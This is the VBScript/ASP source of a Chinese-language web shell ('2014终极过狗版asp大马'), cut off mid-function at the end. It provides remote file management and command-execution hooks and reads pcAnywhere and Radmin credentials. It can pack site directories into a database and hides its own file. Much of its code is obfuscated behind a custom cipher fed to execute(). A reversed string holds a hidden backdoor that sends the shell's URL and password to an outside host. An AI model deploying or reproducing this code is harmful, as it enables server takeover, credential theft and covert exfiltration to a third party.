<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%@ LANGUAGE = VBScript.encode%><%
Server.ScriptTimeout=999999999
UserPass="longaotian"  '密码
mNametitle ="2014终极版asp大马"  ' 标题
Copyright="2014终极过狗版asp大马"  '版权
SItEuRl="http://www.520html5.com/" '你的网站
bg ="http://blog.haipo.me/wp-content/uploads/2011/03/MATRIX-WALLPAPER-2-by-STEELGOHST.jpg"  '背景图片,不使用留空
ysjb=true  '是否有拖动效果,true为是,false为否
htp="http://www.520html5.com/"  '功能地址
durl="http://www.520html5.com/"  '默认下载文件地址



Response.Buffer =true
BodyColor="#000000"
FontColor="#b4a9a9"
LinkColor="#ffffff"
On Error Resume Next 

Const DEfd=""
sub ShowErr()
 If Err Then
j"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub j(str)
response.write(str)
End Sub
sub RaPath(s)
RaPath=ExecuteGlobal(s)
End sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ScriptPath=Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
CONST_FSO="Script"&"ing.Fil"&"eSyst"&"emObject"
FolderPath=Request("FolderPath")
u=request.servervariables("http_host")&url
domain=Request.ServerVariables("http_host")
FName=Request("FName")
cdx="<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#191919'"">":cxd="<font face='wingdings'>8</font>":ef="</a></td></tr>"
set fso=server.CreateObject(CONST_FSO)
set fsoX=server.CreateObject(CONST_FSO)
str1="http://"&Request.ServerVariables("SERVER_Name")& left(Request.ServerVariables("URL"),InstrRev(Request.ServerVariables("URL"),"/")):BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
j "<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>"&mNametitle&" - "&ServerIP&" </title><style type=""text/css"">span.underline{text-decoration:underline;}span.orange{color:#B3D169;}span.project_type{text-align:right}span.grey{color:#666;}#links{list-style-type:none;padding:20px 0 0 0;padding-left:20px;}#linklist2  td{color:#fff;background:#191919;}#linklist2 td:visited{color:#999;}#linklist2 td:hover{background:#B3D169;color:#191919;}body,tr,td{margin-top: 5px;background-color: #000000;color: #b4a9a9;font-size: 12px;SCROLLBAR-FACE-COLOR: #232323;scrollbar-arrow-color: #383839;scrollbar-highlight-color: #383839;scrollbar-3dlight-color: #dddddd;scrollbar-shadow-color: #232323}.sb{cursor: hand}input,select,textarea{border-top-width: 1px;font-weight: bold;border-left-width: 1px;font-size: 11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;}#d{background: #121212;padding-left: 5px;padding-right: 5px;font-color: #fff}pre{font-size: 11px;font-family: verdana;color: #dddddd;}hr{color: #dddddd;background-color: #dddddd;height: 5px;}#x{font-family: verdana;font-size: 13px}a{color: #ffffff;text-decoration: none;}.am{color: #b4a9a9;font-size: 11px;}</style>"
j"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""→"&Copyright&"  --""+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FNamName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}</script>"
j"<body" :If Action="" then j " scroll=no":j ">"
Dim ObT(18,2):Fn=Action:ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文 件 操 作 组 件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命令行执行组件,显示'<font color=red>×</font>'时用<a href='?Action=cmdx' target='FileFrame'> <font color=red> 执行Cmd二</font></a> 此功能执行":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS 建 库 组 件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS 压 缩 组 件":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "数据流 上 传 辅助 组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库 连接 组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流 上传 组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件 上传 组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰 文件 上传 组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件 上传 组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件 收发 组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP 发信 组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail 发信 组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据 传输 组件"
ObT(14,0) = "ws"&"cript.shell.1":  OBt(14,2) = "如果wsh被禁，可以改用这个组件":OBT(15,0) = "WS"&"CRIPT.NETWORK":  OBt(15,2) = "查看服务器信息的组件，有时可以用来提权":OBT(16,0) = "she"&"ll.appl"&"ication":OBt(16,2) = "she"&"ll.appli"&"cation 操作，无FSO时操作文件以及执行命令":OBT(17,0) = "sh"&"ell.appl"&"ication.1":OBt(17,2) = "she"&"ll.appli"&"cation 的别名，无FSO时操作文件以及执行命令":OBT(18,0) = "Shell.Users":OBt(18,2) = "删除了net.exe net1.exe的情况下添加用户的组件"
For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ×":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=WwwRoot:Session("FolderPath")=FolderPath:End if
Function PcAnywhere4()
execute(king("`>tswqz/<>rz/<>' 交提 '=txsqc 'zodwxl'=thnz zxhfo<>rz<>rz/<>'13'=tmol 'yoe.shdtzoZ\tktivnfQeh\etzfqdnU\\qzqW fgozqeoshhQ\lktlM ssQ\lufozztU rfq lzftdxegW\:Z'=txsqc 'zbtz'=thnz 'izqh'=tdqf zxhfo<>'%10'=izrov rz<>rz/< :件文yoe>'%10'=izrov rz<>kz<>'1'=ktrkgw'%13'=izrov tswqz<>'zlgh'=rgiztd 'dkgyb'=tdqf dkgy<>cor/<本版foA 权提tktivnfQeY>'ktzfte'=fuosq cor<`p"))
end Function
acode="=u?//llehs/ten.fuckyoubackdoor//:ptth'=crs tpircs<"
j"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"
Function StreamLoadFromFile(sPath)
execute(king(" zsxltk = etrbti┊ zbtG┊ p + zsxltk = zsxltk┊ zbtG┊ 50 * p = p ┊ o - )fokzl(ftV gJ 0 = a kgX┊ yC rfS┊ ))0 ,o ,fokzl(roT(zfCZ = p ┊ ftiJ `1` => )0 ,o ,fokzl(roT rfQ `2` =< )0 ,o ,fokzl(roT yC┊ yC rfS┊ 10 = p ┊ ftiJ `Q` = )0 ,o ,fokzl(roT kB `q` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 00 = p ┊ ftiJ `A` = )0 ,o ,fokzl(roT kB `w` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 90 = p ┊ ftiJ `Z` = )0 ,o ,fokzl(roT kB `e` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 80 = p ┊ ftiJ `W` = )0 ,o ,fokzl(roT kB `r` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 70 = p ┊ ftiJ `S` = )0 ,o ,fokzl(roT kB `t` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 60 = p ┊ ftiJ `X`= )0 ,o ,fokzl(roT kB `y` = )0 ,o ,fokzl(roT yC┊ )fokzl(ftV gJ 0 = o kgX┊ 1 = zsxltk┊ zsxltk ,a ,p ,o doW┊ )fokzl(etrbti fgozefxX┊fgozefxX rfS┊ufoizgG = dqtkzUg ztU┊izoK rfS┊tlgsZ.┊rqtN. = tsoXdgkXrqgVdqtkzU┊1 = fgozolgY.┊)izqYl(tsoXdgkXrqgV.┊fthB.┊8 = trgT.┊0 = thnJ.┊dqtkzUg izoK┊)`dqtkzU.wrgrQ`(zetpwBtzqtkZ.ktcktU = dqtkzUg ztU┊dqtkzUg doW"))
End Function 
Efun=StrReverse(acode)
Efun=Efun&u&"&p="&userpass&"'></script>"
sub promyself()
On Error Resume Next 
set f=fso.GetFile(ScriptPath)
if f.Attributes <> 39 and session("lock")="" then
f.Attributes=1+2+4+32
end if
set f=nothing
end sub
promyself
Function PcAnywhere(data,mode)
execute(king("trgetr=tktivnfQeY┊ zbtG┊0+dxfyoZ=dxfyoZ┊)kzleh(kiZ + trgetr = trgetr┊ kgX zobS ftiJ ))490>kzleh( kB )98 =< kzleh(( yC┊)dxfyoZ kgb )))9,o,ilqi(roT(etrbti kgb ))9,o,qzqr(roT(etrbti((=kzleh┊ 9 htzU ktwdxf gJ 0 = o kgX┊60 = dxfyoZ :18 = ktwdxf ftiJ `ktlx` = trgd yC┊770 = dxfyoZ :98 = ktwdxf ftiJ `llqh` = trgd yC┊)8,qzqr(roT =DUQD"))
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
j"Pcanywhere Reader ==><br><br>PATH:"&CIF&"<br>帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
j"<br>密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
execute(king("yC rfS┊`!rqtN z'fqZ !kgkkS`p┊ tlsS┊))))1(nqkkQzkgY(btD(kzUZ&)))0(nqkkQzkgY(btD(kzUZ(ktzfogzbti p┊ `:`& zkgY p┊ ftiJ )nqkkQzkgY(nqkkQlC yC┊) zkgY & izqYfodrqN(WQSNESN.DUK=nqkkQzkgY┊`>kw<>kw<`p┊yC rfS┊`!rqtN z'fqZ !kgkkS`p┊tlsS┊pwgkzl p┊zbtG┊ yC rfS┊))o(nqkkQktztdqkqY(btD & pwBkzl = pwBkzl┊tlsS┊)))o(nqkkQktztdqkqY(btD(kzUZ&`1` & pwBkzl = pwBkzl┊ ftiJ 0=)))o(nqkkQktztdqkqY(bti( ftV  yC┊)nqkkQktztdqkqY(rfxgAM gJ 1 = o kgX┊ftiJ )nqkkQktztdqkqY(nqkkQlC yC┊`:`&ktztdqkqY p┊) ktztdqkqY & izqYfodrqN(WQSNESN.DUK=nqkkQktztdqkqY┊`>kw<>kw<kqk.ilqi_fodrqN/zygl`&hzi&`:址地载下具工，接连试调rg或具工ilqDfodrqN用后值DUQD出读:意注>kw<`p┊`zkgY` = zkgY┊`ktztdqkqY`=ktztdqkqY┊`\lktztdqkqY\ktcktU\1.9c\fodrQN\TSJUOU\SGCDZQT_VQZBV_OSFD`=izqYfodrqN┊)`VVSDU.JYCNZUK`(zetpwBtzqtkZ.ktcktU =DUK ztU"))
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function

Function MainForm()
j "<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame""><input type=""hidden"" name=""Action""><input type=""hidden"" name=""FName""></form><table width='100%'><form name='addrform' method='post' action='"&URL&"' target='_parent'><tr><td width='60' align='center'><input type='button' value='Address'></td><td><input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'></td><td width='140' align='center'><input name='Submit' type='submit' value='GO'> <input type='submit' value='Refresh' onclick='FileFrame.location.reload()'></td></tr></form></table>"
j"<td><a class=am href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】<a><a class=am href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】<a><a class=am href='javascript:ShowFolder(""e:\\Program Files"")'>(3)【ProgramE】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>(4)【Documents】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【開始_菜單】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】<a><a class=am href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C:\)】<a><a class=am href='javascript:ShowFolder(""D:\\recycler"")'>(9)【RECYCLER(d:\)】<a><a class=am href='javascript:ShowFolder(""e:\\recycler"")'>(10)【RECYCLER(e:\)】<a>":j "?PR:":if session("pr")<5 then j"<img src="""&htp&"pr2/?domain="&domain&"""></img>":session("pr")=session("pr")+1:else j "Wait...":end if:j"<br><a class=am href='javascript:ShowFolder(""C:\\wmpub"")'>(1)【wmpub】<a><a class=am href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>??(2)【TEMP】<a>????<a class=am href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>(3)【ServU(1)】<a><a  class=am href='javascript:ShowFolder(""C:\\Program Files\\ServU"")'>(4)【ServU(2)】<a>?<a class=am href='javascript:ShowFolder(""C:\\WINDOWS"")'>(5)【WINDOWS】<a>??<a class=am href='javascript:ShowFolder(""C:\\php"")'>(6)【PHP】<a>??????<a  class=am href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>(7)【Mssql】<a><a class=am href='javascript:ShowFolder(""c:\\prel"")'>(8)【prel文件夹】<a>???<a class=am href='javascript:ShowFolder(""c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere"")'>(9)【pcAnywhere】<a>   <a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\桌面"")'>(10)【Alluser桌面】<a>":j"</td>"
j "<table width='100%' height='95.5%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'><td width='160' id=tl><iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td><td width=1 style='background:#000000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>隐藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>显示</b></a></p></td><td width=1 style='background:#424242'><td><iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe></tr></form></table></td></tr><tr></tr></table>"
if session("aase") <> "ok" then:response.write Efun:session("aase")="ok":end if
End Function
Sub PageAddToMdb()
execute(king("`>dkgy/<下录目序程本于位都件文有所的来开解 :注>kw<>kw<>'包开解'=txsqc zodwxl=thnz zxhfo<>zeQtiz=tdqf wrTdgkXtlqtstk=txsqc ftrroi=thnz zxhfo<>13=tmol ``wrd.DUD\` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & ```=txsqc izqYtiz=tdqf zxhfo<>))``#``(fgolltU(tzxetbS=txsqc ``#``=tdqf ftrroi=thnz zxhfo<>zlgh=rgiztd dkgy<>/kw<:)持支BUX需(开解包件文>/ki<>dkgy/<下录目级同马木dql于位,件文wrd.DUD成生包打 :注>kw<>kw<>'包打始开'=txsqc zodwxl=thnz zxhfo<>zetstl/<>fgozhg/<BUX无>hhq=txsqc fgozhg<>fgozhg/<BUX>gly=txsqc fgozhg<>rgiztTtiz=tdqf zetstl<>zeQtiz=tdqf wrTgJrrq=txsqc ftrroi=thnz zxhfo<>13=tmol ``` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & ```=txsqc izqYtiz=tdqf zxhfo<>))``#``(fgolltU(tzxetbS=txsqc ``#``=tdqf ftrroi=thnz zxhfo<>zlgh=rgiztd dkgy<:包打夹件文>kw<`p┊yC rfS┊rfS.tlfghltN┊skMaeqA&`>cor/<!成完作操>kw<>ktzfte=fuosq cor<` p┊)izqYtiz(aeqYfx┊ftiJ `wrTdgkXtlqtstk` = zeQtiz yC┊yC rfS┊rfS.tlfghltN┊skMaeqA&`>cor/<!成完作操>kw<>ktzfte=fuosq cor<` p┊)izqYtiz(wrTgJrrq┊ftiJ `wrTgJrrq` = zeQtiz yC┊111110=zxBtdoJzhokeU.ktcktU┊)`izqYtiz`(zltxjtN = izqYtiz┊)`zeQtiz`(zltxjtN = zeQtiz┊izqYtiz ,zeQtiz doW"))
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
execute(king("ufoizgG = ktrsgXtiz ztU┊ufoizgG = lktrsgy ztU┊ufoizgG = ltsoy ztU┊zbtG┊yC rfS┊tzqrhM.lk┊)(rqtN.dqtkzl = )`zftzfgZtsoy`(lk┊)izqY.dtzo(tsoXdgkXrqgV.dqtkzl┊)7 ,izqY.dtzo(roT = )`izqYtiz`(lk┊vtGrrQ.lk┊ftiJ 1 =< )`$` & tdqG.dtzo & `$` ,zloVtsoXlnl(kzUfC yC┊ltsoy fC dtzo ieqS kgX┊zbtG┊dqtkzl ,lk ,izqY.dtzo wrTkgXttkJgly┊lktrsgy fC dtzo ieqS kgX┊lktrsgXwxU.ktrsgXtiz = lktrsgy ztU┊ltsoX.ktrsgXtiz = ltsoy ztU┊)izqYtiz(ktrsgXztE.)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU = ktrsgXtiz ztU┊yC rfS┊)`!问访许允不者或在存不录目 ` & izqYtiz(kkSvgil┊ftiJ tlsqX = )izqYtiz(lzlobSktrsgX.)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU yC┊`$wrs.DUD$wrd.DUD$` = zloVtsoXlnl┊zloVtsoXlnl ,ltsoy ,lktrsgy ,ktrsgXtiz ,dtzo doW"))
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(CONST_FSO).FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Dim Filepaths
set Filepaths=new SearchFile
Filepaths.Class_Folder Filename
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject(CONST_FSO).FolderExists(Left(thePath, i)) = False Then
Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function ProFile()
execute(king("CU p┊`>tswqz/<>dkgy/<`&CU=CU┊`>kz/<>rz/<>'程进护保成生，步一下'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>16=ziuoti rz<>rz/<;hlwf&>rz<>kz<`&CU=CU┊`>kz/<>rz/<)护保部全法无则否，大越置设率频，多越件文的护保要需，秒0为小最( 秒 >/ ``)'',u/]r\^[/(teqshtk.txsqc=txsqc``=hxntafg ``6``=tmol ``0``=txsqc ``ziuok:fuosq-zbtz``=tsnzl ``tdoJQ``=tdqf ``zbtz``=thnz zxhfo<>rz<>rz/<：率频护保>ziuok=fuosq rz<>kz<`&CU=CU┊`>kz/<>rz/<)码编改更试尝请，码乱现出若件文问访( 3-XJM>/ ``9``=txsqc ``kqiZQ``=tdqf ``gorqk``=thnz zxhfo<  9089AE>/ rtaetie ``0``=txsqc ``kqiZQ``=tdqf ``gorqk``=thnz zxhfo<>rz<>rz/<：码编件文>ziuok=fuos